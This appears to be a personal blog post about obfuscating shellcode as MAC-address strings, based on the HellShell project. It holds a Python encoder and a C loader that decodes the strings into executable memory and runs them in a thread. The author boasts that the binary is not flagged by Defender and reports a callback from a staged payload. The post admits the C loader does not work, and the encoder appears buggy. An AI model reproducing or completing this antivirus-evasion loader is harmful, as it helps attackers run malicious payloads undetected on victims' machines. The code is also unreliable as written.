# Overview
So I found this:  https://github.com/NUL0x4C/HellShell which is an decoder for MACaddr -> shellcode but it just seems to be a POC to convert the MACShell. So to build this out I need two things. Build out the encoder for macaddr (I'll add ipv4 and ipv6 after the macaddr one works.) Then a program to decrypt and inject the shell code.

# Encoder
Going to use python cause opening files in C seems to hard. Going to dump the code then explain it.
```python
def encode_mac(file_name,outfile="./mac_addr_shellcode.txt") -> list:
    #read from file and do some magic.
    raw_bytes = ''
    with open(file_name,'r') as file:
        for line in file:
            if (len(line.strip()[1:-1])!=56):
                raw_bytes += line.strip()[1:-2]
                raw_bytes +='\\x90'*round((16-(len(line.strip()[1:2])%16))/8)
            else:
                raw_bytes += line.strip()[1:-1]
    
    mac_arr = [raw_bytes[i*24:i*24+24].replace("\\x","-")[1:] for i in range(len(raw_bytes)//24)]

    #write to file no magic :(
    with open(outfile,'w') as out:
        counter = 0
        for i in mac_arr:
            counter+=1
            if counter==4:
                out.write(i+'",\n')
                counter =0
            elif counter==1:
                out.write('"'+i+'", "')
            else:
                out.write(i+'", "')
            
if __name__ == "__main__":
    encode_mac('./code.c')
```

So for the macaddrs they are basically 6 bytes. (each byte being of length for `\xFF`). One thing to account for is padding. 
```python
raw_bytes +='\\x90'*round((16-(len(line.strip()[1:2])%16))/8)
```

All this is doing is checking how many more bytes are need to fill the final mac addr. Then padding with `\x90` which is a NOP byte, meaning it does nothing.

# Building the Injector
So asking chatgpt to do it (and a bit of clean up by me) gives this:
```c
#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const char* MACShell[] = {
	#macencoded payload
};
#define ElementsNumber 64
#define SizeOfShellcode 384

BOOL DecodeMACFuscation(const char* MAC[], PVOID LpBaseAddress) {
	PCSTR Terminator = NULL;
	PVOID LpBaseAddress2 = NULL;
	NTSTATUS STATUS;
	int i = 0;
	for (int j = 0; j < ElementsNumber; j++) {
		LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);
		STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[j], &Terminator, (DL_EUI48*)LpBaseAddress2);
		if (!NT_SUCCESS(STATUS)) {
			printf("[!] RtlEthernetStringToAddressA failed for %s result %x", MAC[j], STATUS);
			return FALSE;
		}
		else {
			i = i + 6;
		}
	}
	return TRUE;
}


DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

int main() {
	PVOID LpBaseAddress = NULL;
	printf("[i] SizeOf MacShell : %d \n", sizeof(MACShell));

	LpBaseAddress = VirtualAllocEx(GetCurrentProcess(), NULL, sizeof(MACShell), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!LpBaseAddress) {
		printf("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return -1;
	}
	printf("[+] LpBaseAddress: 0x%0-16p \n", (void*)LpBaseAddress);


	if (!DecodeMACFuscation(MACShell, LpBaseAddress)) {
		return -1;
	}

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LpBaseAddress, NULL, NULL, &TID);
	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)\n--0x%p\n", k, TID, hThread);

	printf("%s waiting for thread to finish\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n", k);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return EXIT_SUCCESS;

}
```

which doesn't work.

## Trying to fix c code
I get a call back when using a staged payload but other then that I get nothing. At least the binary doesn't get flagged by defender. :)

A good start to debug this is to check if the shellcode is decoded correctly in the thread. 

How? yea I have no idea.

# Nim
Lets redo the entire thing but with nim! I just learnt it so this is going to go very well.
